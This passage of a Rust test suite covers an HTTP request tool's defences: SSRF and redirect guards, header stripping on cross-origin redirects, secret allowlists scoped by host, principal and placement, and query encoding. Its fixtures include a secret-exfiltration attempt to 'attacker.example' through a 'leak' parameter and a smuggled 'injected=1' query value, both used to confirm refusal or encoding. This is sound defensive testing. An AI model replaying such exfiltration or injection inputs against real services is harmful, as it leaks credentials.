        request.lines().next().unwrap_or_default().to_string()
    }

    /// Two one-shot servers: the first redirects to the second, which returns `final_body` and
    /// reports the raw request headers it received. `initial_host` controls the spelling used for
    /// the first URL so tests can grant `localhost` without also granting the `127.0.0.1` target.
    async fn redirect_to_loopback(
        initial_host: &str,
        final_body: &'static str,
    ) -> (String, tokio::sync::oneshot::Receiver<String>) {
        let target = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let target_addr = target.local_addr().unwrap();
        let (seen_tx, seen_rx) = tokio::sync::oneshot::channel();
        tokio::spawn(async move {
            if let Ok((mut sock, _)) = target.accept().await {
                let mut buf = vec![0u8; 8192];
                let n = sock.read(&mut buf).await.unwrap_or(0);
                let _ = seen_tx.send(String::from_utf8_lossy(&buf[..n]).into_owned());
                let resp = format!(
                    "HTTP/1.1 200 OK\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{final_body}",
                    final_body.len()
                );
                let _ = sock.write_all(resp.as_bytes()).await;
            }
        });

        let source = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let source_port = source.local_addr().unwrap().port();
        tokio::spawn(async move {
            if let Ok((mut sock, _)) = source.accept().await {
                let mut buf = [0u8; 2048];
                let _ = sock.read(&mut buf).await;
                let resp = format!(
                    "HTTP/1.1 302 Found\r\nlocation: http://{target_addr}/final\r\ncontent-length: 0\r\nconnection: close\r\n\r\n"
                );
                let _ = sock.write_all(resp.as_bytes()).await;
            }
        });
        (
            format!("http://{initial_host}:{source_port}/start"),
            seen_rx,
        )
    }

    fn tool(private_net: PrivateNetAllow) -> HttpRequestTool {
        HttpRequestTool::new(&WebOptions {
            private_net,
            ..Default::default()
        })
    }

    #[tokio::test]
    async fn not_found_is_a_result_not_a_failure() {
        // Loopback is private, so grant the `web` scope for the test.
        let base = one_shot("404 Not Found", "nope").await;
        let t = tool(PrivateNetAllow::Any);
        let r = t
            .execute(&ctx(), json!({ "url": base }))
            .await
            .expect("a 404 must be a successful op, not an Err");
        assert!(!r.is_error, "a 404 is a result, not a tool error");
        assert_eq!(record(&r)["status"], 404, "the status is a value: {r:?}");
    }

    #[tokio::test]
    async fn private_target_refused_without_grant() {
        let base = one_shot("200 OK", "hi").await;
        let t = tool(PrivateNetAllow::None);
        let err = t.execute(&ctx(), json!({ "url": base })).await;
        assert!(
            err.is_err(),
            "a loopback target must be refused without a `web` grant"
        );
    }

    #[tokio::test]
    async fn redirect_target_is_guarded_before_the_second_request() {
        let (url, _seen) = redirect_to_loopback("localhost", "must not arrive").await;
        let t = tool(PrivateNetAllow::from_hosts(["localhost".to_string()]));
        let err = t
            .execute(&ctx(), json!({ "url": url }))
            .await
            .expect_err("the ungranted loopback redirect target must be refused");
        assert!(
            err.to_string().contains("private/loopback"),
            "the shared SSRF guard names the denial: {err}"
        );
    }

    #[tokio::test]
    async fn cross_origin_redirect_drops_all_caller_headers() {
        let (url, seen) = redirect_to_loopback("127.0.0.1", "ok").await;
        let t = tool(PrivateNetAllow::Any);
        let result = t
            .execute(
                &ctx(),
                json!({
                    "url": url,
                    "headers": {
                        "Authorization": "Bearer caller-secret",
                        "Cookie": "session=caller-secret",
                        "Proxy-Authorization": "Basic caller-secret",
                        "X-Api-Key": "caller-secret",
                        "X-Custom": "also-sensitive"
                    }
                }),
            )
            .await
            .unwrap();
        assert_eq!(record(&result)["body"], "ok");
        let request = seen.await.expect("redirect destination received a request");
        let lower = request.to_ascii_lowercase();
        for name in [
            "authorization:",
            "cookie:",
            "proxy-authorization:",
            "x-api-key:",
            "x-custom:",
        ] {
            assert!(
                !lower.contains(name),
                "cross-origin redirect forwarded {name}: {request}"
            );
        }
    }

    /// Records `record_private_admit` calls so the audit path can be asserted without an event store.
    #[derive(Default)]
    struct RecordingAudit {
        calls: Mutex<Vec<(String, String, String)>>,
    }
    impl flux_plugin::EgressAudit for RecordingAudit {
        fn record_private_admit(&self, caller: &str, host: &str, grant_source: &str) {
            self.calls.lock().unwrap().push((
                caller.to_string(),
                host.to_string(),
                grant_source.to_string(),
            ));
        }
    }

    #[tokio::test]
    async fn private_admit_emits_audit_event() {
        let base = one_shot("200 OK", "ok").await;
        let audit = Arc::new(RecordingAudit::default());
        let t = HttpRequestTool::new(&WebOptions {
            private_net: PrivateNetAllow::Any,
            audit: Some(audit.clone()),
            grant_source: Some("cli:--allow-private-net".into()),
            ..Default::default()
        });
        t.execute(&ctx(), json!({ "url": base })).await.unwrap();
        let calls = audit.calls.lock().unwrap();
        assert_eq!(calls.len(), 1, "one private admit audited");
        assert_eq!(calls[0].0, "web:http.request", "caller label");
        assert_eq!(calls[0].1, "127.0.0.1", "the private host reached");
        assert_eq!(calls[0].2, "cli:--allow-private-net", "grant source label");
    }

    /// C-652, the story's behavioral test: a **selected** substrate answers for the effect, and a
    /// refusal is a refusal.
    ///
    /// Placement moving to `SelectedExecutionSystem` keeps `http.request` visible under a selected
    /// host, and that visibility is only honest if the effect actually follows the selection. A
    /// `RemoteSystem` whose delegate serves no HTTP answers `Unserved`; the op must surface that.
    /// C-674 gave the protocol a frame, so what is missing here is the delegate's family rather
    /// than the wire — and the refusal is checked structurally, which is how it is meant to be
    /// classified.
    ///
    /// The loopback server is live and reachable on purpose. If the op still held a local client on
    /// this path it would answer `200 OK` and the test would pass for the wrong reason — so the
    /// assertion is on the refusal, and the server standing untouched is what makes it meaningful.
    #[tokio::test]
    async fn a_selected_substrate_that_serves_no_http_refuses_rather_than_sending_locally() {
        struct ServesNothing;
        impl flux_system::remote::Delegate for ServesNothing {}

        let base = one_shot("200 OK", "this body must never be read").await;
        let tool = HttpRequestTool::new(&WebOptions {
            private_net: PrivateNetAllow::Any,
            ..Default::default()
        });
        let selected = Arc::new(flux_system::remote::RemoteSystem::new(Arc::new(
            ServesNothing,
        )));
        let ctx = ctx().with_execution_system(selected);

        let error = tool
            .execute(&ctx, json!({ "url": format!("{base}/v1") }))
            .await
            .expect_err("a selected substrate that serves no HTTP must refuse the effect");

        let message = error.to_string();
        assert_eq!(
            flux_system::remote::failure_mode(&error),
            Some(flux_system::remote::FailureMode::Unserved),
            "the operator must be told the substrate cannot carry this, not handed a local \
             answer: {message}"
        );
        assert!(
            !message.contains("this body must never be read"),
            "the request reached the network from the coordinator's process: {message}"
        );
    }

    /// C-652 — and the *unselected* run is unchanged: the op reaches its own reviewed native
    /// backend, through the same guard, pin and cap it always used.
    #[tokio::test]
    async fn an_unselected_run_still_reaches_the_native_backend() {
        let base = one_shot("200 OK", "{\"ok\":true}").await;
        let tool = HttpRequestTool::new(&WebOptions {
            private_net: PrivateNetAllow::Any,
            ..Default::default()
        });

        let result = tool
            .execute(&ctx(), json!({ "url": format!("{base}/v1") }))
            .await
            .expect("no substrate selected means the native backend serves");
        let record: Value = serde_json::from_str(&result.content).unwrap();

        assert_eq!(record["status"], 200);
        assert_eq!(record["body"]["ok"], true);
    }

    /// Build a tool with an explicit secret allowlist (bypasses the `FLUX_WEB_SECRET_ALLOW` env
    /// fallback so these tests never race on a process-global var).
    fn tool_allowing(private_net: PrivateNetAllow, secrets: &[&str]) -> HttpRequestTool {
        HttpRequestTool::new(&WebOptions {
            private_net,
            allowed_secrets: Some(secrets.iter().map(|s| s.to_string()).collect()),
            ..Default::default()
        })
    }

    #[tokio::test]
    async fn secret_header_is_resolved_and_seeded_into_the_redactor() {
        std::env::set_var("FLUX_WEB_TEST_TOKEN", "super-secret-42");
        let base = one_shot("200 OK", "ok").await;
        let t = tool_allowing(PrivateNetAllow::Any, &["FLUX_WEB_TEST_TOKEN"]);
        let c = ctx();
        t.execute(
            &c,
            json!({
                "url": base,
                "headers": { "authorization": { "$secret": "FLUX_WEB_TEST_TOKEN" } }
            }),
        )
        .await
        .unwrap();
        // The resolved token was registered with the redactor, so it is scrubbed everywhere output
        // or logs might carry it.
        let scrubbed = c.redactor.redact("leak: super-secret-42 end");
        assert!(
            !scrubbed.contains("super-secret-42"),
            "the resolved secret must be redacted: {scrubbed}"
        );
    }

    #[tokio::test]
    async fn missing_secret_header_env_is_a_clean_error() {
        let base = one_shot("200 OK", "ok").await;
        // Allowlisted but unset: the request passes the allowlist gate and then fails cleanly on
        // the missing value (not the allowlist refusal).
        let t = tool_allowing(PrivateNetAllow::Any, &["FLUX_WEB_DEFINITELY_UNSET"]);
        let err = t
            .execute(
                &ctx(),
                json!({
                    "url": base,
                    "headers": { "authorization": { "$secret": "FLUX_WEB_DEFINITELY_UNSET" } }
                }),
            )
            .await
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("FLUX_WEB_DEFINITELY_UNSET") && err.contains("not set"),
            "names the missing var: {err}"
        );
    }

    /// C-76: a `$secret` naming an env var that is NOT on the allowlist must be refused — even when
    /// the var is set in the environment — and its value must never be read or sent. This is the
    /// single-call exfiltration primitive the story closes.
    #[tokio::test]
    async fn secret_ref_to_non_allowlisted_env_var_is_refused() {
        std::env::set_var("FLUX_WEB_STOLEN_TOKEN", "exfiltrate-me");
        let base = one_shot("200 OK", "ok").await;
        // Deny-all allowlist, though the classic exfil target is present in the environment.
        let t = tool_allowing(PrivateNetAllow::Any, &[]);
        let err = t
            .execute(
                &ctx(),
                json!({
                    "url": base,
                    "headers": { "x-api-key": { "$secret": "FLUX_WEB_STOLEN_TOKEN" } }
                }),
            )
            .await
            .expect_err("a non-allowlisted secret ref must be refused, not sent");
        let msg = err.to_string();
        assert!(
            msg.contains("allowlist") && !msg.contains("exfiltrate-me"),
            "refusal must name the allowlist and never leak the value: {msg}"
        );
    }

    /// C-459 failing-first — **the destination axis**. C-76 scopes which secret may be *named*;
    /// nothing scoped where a named secret may *go*. A secret declared `to=api.example.com` must be
    /// refused for a host the caller is otherwise perfectly entitled to reach.
    ///
    /// The caller here holds `PrivateNetAllow::Any`, so `guard_url_scoped` admits the loopback
    /// target without complaint: the only thing that can refuse this request is the secret's own
    /// scope. And the refusal has to happen *before* any byte leaves the process — a scope that
    /// notices after the send is a post-mortem, not a control.
    #[tokio::test]
    async fn a_destination_scoped_secret_is_refused_for_an_out_of_scope_host() {
        std::env::set_var("FLUX_TEST_WEB_SCOPED_TOKEN", "scoped-secret-42");
        let (base, seen) = capture_request().await;
        let t = tool_allowing(
            PrivateNetAllow::Any,
            &["FLUX_TEST_WEB_SCOPED_TOKEN;to=api.example.com"],
        );
        let err = t
            .execute(
                &ctx(),
                json!({
                    "url": base,
                    "headers": { "authorization": { "$secret": "FLUX_TEST_WEB_SCOPED_TOKEN" } }
                }),
            )
            .await
            .expect_err("a secret scoped to api.example.com must not travel to 127.0.0.1");
        let msg = err.to_string();
        assert!(
            msg.contains("127.0.0.1") && msg.contains("api.example.com"),
            "the refusal names the destination refused and the scope it violated: {msg}"
        );
        assert!(
            !msg.contains("scoped-secret-42"),
            "a refusal never quotes the value: {msg}"
        );
        let reached = tokio::time::timeout(Duration::from_millis(250), seen).await;
        assert!(
            reached.is_err(),
            "the refused request must never reach the wire: {reached:?}"
        );
    }

    /// The other half of C-459's destination axis: the same secret reaches the host its scope
    /// names, and actually arrives on the header it was asked for. A refusal-only test would pass
    /// against a scope that refused everything.
    #[tokio::test]
    async fn a_destination_scoped_secret_still_reaches_the_host_its_scope_names() {
        std::env::set_var("FLUX_TEST_WEB_INSCOPE_TOKEN", "in-scope-secret-42");
        let (base, seen) = capture_request().await;
        let t = tool_allowing(
            PrivateNetAllow::Any,
            &["FLUX_TEST_WEB_INSCOPE_TOKEN;to=127.0.0.1"],
        );
        t.execute(
            &ctx(),
            json!({
                "url": base,
                "headers": { "authorization": { "$secret": "FLUX_TEST_WEB_INSCOPE_TOKEN" } }
            }),
        )
        .await
        .expect("the scope names this host, so the request goes through");
        let request = seen.await.expect("the in-scope host received the request");
        assert!(
            request.to_ascii_lowercase().contains("in-scope-secret-42"),
            "the authorized secret is on the wire: {request}"
        );
    }

    /// ⚠ C-459 — **an unscoped secret keeps working.** A bare `NAME` entry is still valid and still
    /// travels anywhere the caller's own egress scope permits. Breaking every existing
    /// `secret "NAME"` to introduce scoping would guarantee nobody adopted it, so this is the
    /// compatibility floor the whole feature stands on.
    #[tokio::test]
    async fn an_unscoped_secret_keeps_travelling_wherever_the_caller_may_reach() {
        std::env::set_var("FLUX_TEST_WEB_UNSCOPED_TOKEN", "unscoped-secret-42");
        let (base, seen) = capture_request().await;
        let t = tool_allowing(PrivateNetAllow::Any, &["FLUX_TEST_WEB_UNSCOPED_TOKEN"]);
        t.execute(
            &ctx(),
            json!({
                "url": base,
                "headers": { "authorization": { "$secret": "FLUX_TEST_WEB_UNSCOPED_TOKEN" } }
            }),
        )
        .await
        .expect("an unscoped secret behaves exactly as it did before scoping existed");
        let request = seen.await.expect("the request was sent");
        assert!(
            request.to_ascii_lowercase().contains("unscoped-secret-42"),
            "the unscoped secret still reaches the wire: {request}"
        );
        // …and the allowlist says out loud that it is unscoped rather than leaving it to inference.
        let list = flux_system::secret_scope::SecretAllowlist::parse([
            "FLUX_TEST_WEB_UNSCOPED_TOKEN",
            "OTHER;to=api.example.com",
        ]);
        assert_eq!(list.unscoped_names(), vec!["FLUX_TEST_WEB_UNSCOPED_TOKEN"]);
    }

    /// ⚠ C-459 — the scope survives a redirect. Admitting only the *first* hop would leave the
    /// obvious bypass: a host the operator did name answers `302` to one they did not.
    ///
    /// The rule enforced here is deliberately conservative — the whole chain stays inside the scope,
    /// rather than reasoning per-hop about which bytes survive `send_guarded`'s cross-origin header
    /// clearing. A query-placed secret lives in the URL, and a `Location` that echoes the query
    /// carries it onward.
    #[tokio::test]
    async fn a_scoped_secret_does_not_follow_a_redirect_out_of_its_scope() {
        std::env::set_var("FLUX_TEST_WEB_HOP_TOKEN", "hop-secret-42");
        let (url, seen) = redirect_to_loopback("localhost", "must not arrive").await;
        // The caller may reach BOTH spellings, so nothing about the egress grant refuses the hop.
        let t = tool_allowing(
            PrivateNetAllow::from_hosts(["localhost".to_string(), "127.0.0.1".to_string()]),
            &["FLUX_TEST_WEB_HOP_TOKEN;to=localhost"],
        );
        let err = t
            .execute(
                &ctx(),
                json!({
                    "url": url,
                    "headers": { "authorization": { "$secret": "FLUX_TEST_WEB_HOP_TOKEN" } }
                }),
            )
            .await
            .expect_err("the redirect leaves the secret's scope and must be refused");
        let msg = err.to_string();
        assert!(
            msg.contains("redirect") && msg.contains("localhost"),
            "the refusal names the hop and the scope it left: {msg}"
        );
        assert!(
            !msg.contains("hop-secret-42"),
            "never leaks the value: {msg}"
        );
        let reached = tokio::time::timeout(Duration::from_millis(250), seen).await;
        assert!(
            reached.is_err(),
            "the redirect target must never be contacted: {reached:?}"
        );
    }

    /// ⚠ C-459 — the **principal** axis, built on the `TurnIdentity` C-408/C-415 established. Not a
    /// second identity concept: the id matched here is the one the surface froze for the turn.
    ///
    /// On a shared surface this is the difference between a credential the operator holds and one
    /// anyone in the room can spend, so the default-deny direction matters most: a turn for which
    /// no principal was resolved cannot satisfy `by=`.
    #[tokio::test]
    async fn a_principal_scoped_secret_admits_its_principal_and_refuses_every_other_turn() {
        std::env::set_var("FLUX_TEST_WEB_PRINCIPAL_TOKEN", "principal-secret-42");
        let t = tool_allowing(
            PrivateNetAllow::Any,
            &["FLUX_TEST_WEB_PRINCIPAL_TOKEN;by=alice"],
        );
        let params = |base: &str| {
            json!({
                "url": base,
                "headers": { "authorization": { "$secret": "FLUX_TEST_WEB_PRINCIPAL_TOKEN" } }
            })
        };

        // alice is the frozen turn identity: authorized.
        let (base, seen) = capture_request().await;
        let alice =
            flux_runtime::TurnIdentity::unauthenticated_participant("alice", "test-surface");
        flux_runtime::scope_runtime_turn(
            flux_runtime::RuntimeTurnContext::new().with_identity(alice),
            t.execute(&ctx(), params(&base)),
        )
        .await
        .expect("the turn runs as alice, whom the grant names");
        assert!(seen.await.unwrap().contains("principal-secret-42"));

        // bob is not alice.
        let (base, _seen) = capture_request().await;
        let bob = flux_runtime::TurnIdentity::unauthenticated_participant("bob", "test-surface");
        let err = flux_runtime::scope_runtime_turn(
            flux_runtime::RuntimeTurnContext::new().with_identity(bob),
            t.execute(&ctx(), params(&base)),
        )
        .await
        .expect_err("bob may not spend alice's credential");
        assert!(err.to_string().contains("bob"), "{err}");

        // And a turn with no resolved principal is a refusal, not a wildcard.
        let (base, _seen) = capture_request().await;
        let err = t
            .execute(&ctx(), params(&base))
            .await
            .expect_err("`by=` cannot be satisfied by an unidentified turn");
        assert!(
            err.to_string().contains("resolved no principal"),
            "the refusal says the identity is missing, not that the name is: {err}"
        );
    }

    /// C-459 — the injection-site axis. flux resolves a `$secret` marker only in `headers` and in
    /// the `query` record; there is no body path at all, so Vaults' header/body split does not
    /// transfer. The split that *does* matter here is header versus query, because a query-placed
    /// credential lands in a URL that proxies and access logs keep.
    #[tokio::test]
    async fn a_header_only_secret_is_refused_in_a_query_parameter() {
        std::env::set_var("FLUX_TEST_WEB_SITE_TOKEN", "site-secret-42");
        let (base, seen) = capture_request().await;
        let t = tool_allowing(
            PrivateNetAllow::Any,
            &["FLUX_TEST_WEB_SITE_TOKEN;to=127.0.0.1;in=header"],
        );
        let err = t
            .execute(
                &ctx(),
                json!({
                    "url": base,
                    "query": { "api_key": { "$secret": "FLUX_TEST_WEB_SITE_TOKEN" } }
                }),
            )
            .await
            .expect_err("a header-only secret must not be placed in the query string");
        assert!(
            err.to_string().contains("query"),
            "the refusal names the site: {err}"
        );
        let reached = tokio::time::timeout(Duration::from_millis(250), seen).await;
        assert!(reached.is_err(), "nothing was sent: {reached:?}");

        // The same secret on the header it was scoped to goes through.
        let (base, seen) = capture_request().await;
        t.execute(
            &ctx(),
            json!({
                "url": base,
                "headers": { "authorization": { "$secret": "FLUX_TEST_WEB_SITE_TOKEN" } }
            }),
        )
        .await
        .expect("the header placement is the one the grant permits");
        assert!(seen.await.unwrap().contains("site-secret-42"));
    }

    /// C-303 — the injection this story closes. A query value carrying `&injected=1` (plus `#`,
    /// `=`, a space and a non-ASCII character) must arrive as **one** encoded parameter.
    ///
    /// The first half of the test is the hazard itself: the only spelling available before this
    /// story was to interpolate the value into the URL, and that puts a second, attacker-chosen
    /// parameter on the wire. The second half is the `query` map, which must not.
    #[tokio::test]
    async fn query_value_cannot_inject_additional_parameters() {
        const HOSTILE: &str = "puppies&injected=1#frag = ü";

        // The hazard, for the record: interpolated into the URL, the value *is* two parameters.
        let (base, seen) = capture_request().await;
        let t = tool(PrivateNetAllow::Any);
        t.execute(
            &ctx(),
            json!({ "url": format!("{base}/search?q={HOSTILE}") }),
        )
        .await
        .unwrap();
        let interpolated = request_line(&seen.await.unwrap());
        assert!(
            interpolated.contains("injected=1") && !interpolated.contains("%26injected"),
            "the interpolated spelling smuggles a second parameter (that is the bug): \
             {interpolated}"
        );

        // The fix: the same value handed to the structured `query` map is one encoded parameter.
        let (base, seen) = capture_request().await;
        t.execute(
            &ctx(),
            json!({ "url": format!("{base}/search"), "query": { "q": HOSTILE } }),
        )
        .await
        .unwrap();
        let line = request_line(&seen.await.unwrap());
        assert!(
            line.contains("q=puppies%26injected%3D1%23frag%20%3D%20%C3%BC"),
            "every reserved byte percent-encoded per RFC 3986 (`&` `=` `#`, space as %20, \
             non-ASCII as UTF-8): {line}"
        );
        assert!(
            !line.contains("&injected") && !line.contains("&"),
            "exactly one parameter reached the transport — no `&` separator was introduced by the \
             value: {line}"
        );
    }

    /// C-313 — the **key** is encoded too, and until this test nothing observed it. C-303's
    /// reviewer changed `out.push_str(&encoded_key)` to `out.push_str(key)` in `append_query` and
    /// every test in this crate stayed green: the line was correct but unpinned, and an unpinned
    /// line is how the injection class `query` exists to close comes back — through the key half
    /// of the pair. A key is as attacker-reachable as a value: an authored flow builds the `query`
    /// record, and a record key can be interpolated.
    #[tokio::test]
    async fn query_key_is_percent_encoded_like_its_value() {
        let (base, seen) = capture_request().await;
        tool(PrivateNetAllow::Any)
            .execute(
                &ctx(),
                json!({ "url": format!("{base}/s"), "query": { "q&injected=1": "cats" } }),
            )
            .await
            .unwrap();
        let line = request_line(&seen.await.unwrap());
        assert!(
            line.starts_with("GET /s?q%26injected%3D1=cats "),
            "the key's reserved bytes are percent-encoded, so it stays one parameter: {line}"
        );
        assert!(
            !line.contains("&injected"),
            "an unencoded key smuggles a second parameter exactly as an unencoded value does: \
             {line}"
        );

        // The remaining byte classes, as a unit — the key gets RFC 3986 (space is `%20`, not the
        // form encoder's `+`) and non-ASCII goes out as UTF-8 in upper-case hex, same as a value.
        assert_eq!(
            append_query("https://h/p", &[("a b ü".to_string(), "v".to_string())]).unwrap(),
            "https://h/p?a%20b%20%C3%BC=v"
        );
    }

    /// L-101's rule, applied to the query: `null` means "do not send this parameter", but `false`
    /// and `0` are values. Getting this backwards silently drops a `?active=false` filter.
    #[tokio::test]
    async fn query_omits_a_null_but_sends_false_and_zero() {
        let (base, seen) = capture_request().await;
        tool(PrivateNetAllow::Any)
            .execute(
                &ctx(),
                json!({
                    "url": format!("{base}/items"),
                    "query": { "active": false, "cursor": null, "offset": 0, "ratio": 1.5 }
                }),
            )
            .await
            .unwrap();
        let line = request_line(&seen.await.unwrap());
        // Sorted key order, so the URL a given record produces is stable run to run.
        assert!(
            line.starts_with("GET /items?active=false&offset=0&ratio=1.5 "),
            "false and 0 are sent, null is omitted, keys are sorted: {line}"
        );
        assert!(
            !line.contains("cursor"),
            "a null parameter is omitted: {line}"
        );
    }

    /// A URL that already carries a `?` must not grow a second one — the appender owns the
    /// separator and switches to `&`.
    #[tokio::test]
    async fn query_appends_to_a_url_that_already_has_a_question_mark() {
        let (base, seen) = capture_request().await;
        tool(PrivateNetAllow::Any)
            .execute(
                &ctx(),
                json!({ "url": format!("{base}/s?page=2"), "query": { "q": "cats" } }),
            )
            .await
            .unwrap();
        let line = request_line(&seen.await.unwrap());
        assert!(
            line.starts_with("GET /s?page=2&q=cats "),
            "the existing query keeps the `?` and the appended parameter uses `&`: {line}"
        );
        assert_eq!(line.matches('?').count(), 1, "exactly one `?`: {line}");
    }

    /// The `?`-ownership rule as a unit, including the two spellings a hand-built URL arrives in
    /// (a bare trailing `?`, and a fragment that must stay behind the query).
    #[test]
    fn append_query_owns_the_separator_and_keeps_the_fragment_last() {
        let one = [("a".to_string(), "1".to_string())];
        assert_eq!(
            append_query("https://h/p", &one).unwrap(),
            "https://h/p?a=1"
        );
        assert_eq!(
            append_query("https://h/p?x=0", &one).unwrap(),
            "https://h/p?x=0&a=1"
        );
        // A URL already ending on a separator must not gain a second one.
        assert_eq!(
            append_query("https://h/p?", &one).unwrap(),
            "https://h/p?a=1"
        );
        assert_eq!(
            append_query("https://h/p?x=0&", &one).unwrap(),
            "https://h/p?x=0&a=1"
        );
        // The fragment is not part of the query and stays last.
        assert_eq!(
            append_query("https://h/p#frag", &one).unwrap(),
            "https://h/p?a=1#frag"
        );
        // No fields at all leaves the URL byte-identical.
        assert_eq!(
            append_query("https://h/p#frag", &[]).unwrap(),
            "https://h/p#frag"
        );
    }

    /// A key supplied both in the URL and in `query` is refused rather than sent twice: a repeated
    /// parameter is first-wins on some servers and last-wins on others, so "last wins" is not a
    /// decision this op is entitled to make on the caller's behalf.
    #[tokio::test]
    async fn a_duplicate_query_key_is_an_error() {
        let err = tool(PrivateNetAllow::Any)
            .execute(
                &ctx(),
                json!({ "url": "https://example.com/s?q=first", "query": { "q": "second" } }),
            )
            .await
            .expect_err("a key already in the URL must be refused, not appended");
        let msg = err.to_string();
        assert!(
            msg.contains("`q` is already present") && msg.contains("refuses"),
            "the refusal names the key and says why: {msg}"
        );
    }

    /// A nested value has no agreed query spelling, so it is refused — and the diagnostic names the
    /// shape, never the value (a query parameter routinely carries a customer identifier).
    #[test]
    fn a_nested_query_value_is_refused_without_naming_the_value() {
        let err = query_fields(&json!({ "query": { "filter": { "id": "cus_secret" } } }))
            .expect_err("a nested query value must be refused");
        let msg = err.to_string();
        assert!(
            msg.contains("`filter`") && msg.contains("a record"),
            "{msg}"
        );
        assert!(
            !msg.contains("cus_secret"),
            "the value must not leak: {msg}"
        );
    }

    /// The egress allow-list and the evidence log must see the URL as sent — encoded query and all
    /// — not the pre-query template.
    #[test]
    fn permission_subjects_and_the_intent_report_the_encoded_url() {
        let t = tool(PrivateNetAllow::None);
        let params = json!({
            "url": "https://api.example.com/search",
            "query": { "q": "a&b", "page": 2 }
        });
        let expected = "https://api.example.com/search?page=2&q=a%26b";
        assert_eq!(t.permission_subjects(&params), vec![expected.to_string()]);
        let set = t.intents(&params);
        let intent = set.intents.first().expect("one intent");
        assert!(
            matches!(&intent.target, IntentTarget::Url { url } if url == expected),
            "the NetworkFetch intent carries the encoded URL: {:?}",
            intent.target
        );
        assert!(matches!(intent.behavior, IntentBehavior::NetworkFetch));
    }

    /// A query-placed credential goes on the wire but **not** into a subject: `permission_subjects`
    /// cannot fail, so it cannot consult a redactor, and a subject is persisted and matched against
    /// grants. Reporting the unauthenticated URL is the property the connector pack preserves and
    /// this must not regress.
    #[tokio::test]
    async fn a_query_placed_credential_stays_out_of_the_subject_and_is_redacted() {
        // A credential whose encoded spelling differs from its raw one — that is the case a
        // redactor seeded only with the raw value would miss.
        std::env::set_var("FLUX_WEB_TEST_QUERY_KEY", "sk-live/99 99");
        let params = json!({
            "url": "https://api.example.com/v1/x",
            "query": { "api_key": { "$secret": "FLUX_WEB_TEST_QUERY_KEY" }, "q": "hi" }
        });
        let t = tool_allowing(PrivateNetAllow::Any, &["FLUX_WEB_TEST_QUERY_KEY"]);
        let subjects = t.permission_subjects(&params);
        assert_eq!(
            subjects,
            vec!["https://api.example.com/v1/x?q=hi".to_string()]
        );
        assert!(
            !subjects[0].contains("api_key") && !subjects[0].contains("sk-live"),
            "neither the credential nor its parameter reaches a subject: {subjects:?}"
        );

        // …but it does reach the wire, encoded, and both spellings are registered with the
        // redactor so a quoted URL in an error can never carry it.
        let (base, seen) = capture_request().await;
        let c = ctx();
        t.execute(
            &c,
            json!({
                "url": format!("{base}/v1/x"),
                "query": { "api_key": { "$secret": "FLUX_WEB_TEST_QUERY_KEY" } }
            }),
        )
        .await
        .unwrap();
        let line = request_line(&seen.await.unwrap());
        assert!(
            line.contains("api_key=sk-live%2F99%2099"),
            "the credential is sent, encoded: {line}"
        );
        for spelling in ["sk-live/99 99", "sk-live%2F99%2099"] {
            let scrubbed = c.redactor.redact(&format!("url: {spelling} end"));
            assert!(
                !scrubbed.contains(spelling),
                "the {spelling} spelling must be redacted: {scrubbed}"
            );
        }
    }

    /// The allowlist gate is the same one headers go through — a `$secret` in a query parameter
    /// naming a non-allowlisted var is refused before its value is read (C-76).
    #[tokio::test]
    async fn a_non_allowlisted_secret_in_a_query_parameter_is_refused() {
        std::env::set_var("FLUX_WEB_STOLEN_QUERY_TOKEN", "exfiltrate-me-too");
        let err = tool_allowing(PrivateNetAllow::Any, &[])
            .execute(
                &ctx(),
                json!({
                    "url": "https://attacker.example/",
                    "query": { "leak": { "$secret": "FLUX_WEB_STOLEN_QUERY_TOKEN" } }
                }),
            )
            .await
            .expect_err("a non-allowlisted secret ref must be refused, not sent");
        let msg = err.to_string();
        assert!(
            msg.contains("allowlist") && !msg.contains("exfiltrate-me-too"),
            "refusal names the allowlist and never leaks the value: {msg}"
        );
    }

    // -----------------------------------------------------------------------------------------
    // C-304 — the result is a record
    // -----------------------------------------------------------------------------------------

    /// The shape itself: canonical `content` is the record `{status, headers, body}`, the status is
    /// a NUMBER (not a substring of a rendered line), the headers are a map, and a JSON body is
    /// parsed — which is what lets a caller select `.body.data.id` at all.
    #[tokio::test]
    async fn the_result_is_a_record_with_a_numeric_status_a_header_map_and_a_parsed_body() {
        let base = one_shot_with_headers(
            "200 OK",
            vec!["content-type: application/json".into(), "x-rate: 7".into()],
            r#"{"data":{"id":"cus_42"},"page":2}"#.into(),
        )
        .await;
        let r = tool(PrivateNetAllow::Any)
            .execute(&ctx(), json!({ "url": base }))
            .await
            .unwrap();
        let record = record(&r);
        assert_eq!(record["status"], 200);
        assert!(
            record["status"].is_number(),
            "the status is a number a flow can compare: {record}"
        );
        assert_eq!(record["headers"]["content-type"], "application/json");
        assert_eq!(record["headers"]["x-rate"], "7");
        // The point of the story: a field, not a blob.
        assert_eq!(record["body"]["data"]["id"], "cus_42");
        assert_eq!(record["body"]["page"], 2);
        assert_eq!(
            record.as_object().map(|o| o.len()),
            Some(3),
            "exactly `status`, `headers` and `body`: {record}"
        );
    }

    /// The declared `output_schema` — without it a caller has to read the source to learn the shape,
    /// and the analyzer carries no result type at all.
    #[test]
    fn the_spec_declares_the_response_schema() {
        let schema = tool(PrivateNetAllow::None)
            .spec()
            .output_schema
            .expect("`http.request` declares an output_schema");
        assert_eq!(schema["type"], "object");
        let properties = schema["properties"]
            .as_object()
            .expect("the schema describes properties");
        for field in ["status", "headers", "body"] {
            assert!(properties.contains_key(field), "schema omits `{field}`");
        }
        assert_eq!(schema["properties"]["status"]["type"], "integer");
        assert_eq!(schema["properties"]["headers"]["type"], "object");
        // `body` is deliberately untyped — see `parse_body`. Declaring `string` or `object` would be
        // wrong for half of all responses, and a false schema is worse than none.
        assert!(
            schema["properties"]["body"].get("type").is_none(),
            "`body` must not claim one type: {schema}"
        );
        assert_eq!(
            schema["required"],
            json!(["status", "headers", "body"]),
            "every field is always present"
        );
        // And the spec is coherent by the shared checker, not by eye.
        assert!(
            flux_spec::metadata_violations(&tool(PrivateNetAllow::None).spec(), &[]).is_empty(),
            "the finished spec must satisfy the shared coherence rules"
        );
    }

    /// A non-JSON, malformed, or empty body does not fail the call: the record keeps its status and
    /// headers and the body falls through to the raw text. A `404` serving an HTML error page is a
    /// *result* — the same posture as "provider bytes never error a chunk stream".
    #[tokio::test]
    async fn a_non_json_or_empty_body_still_produces_a_usable_record() {
        for (status_line, expected_status, body) in [
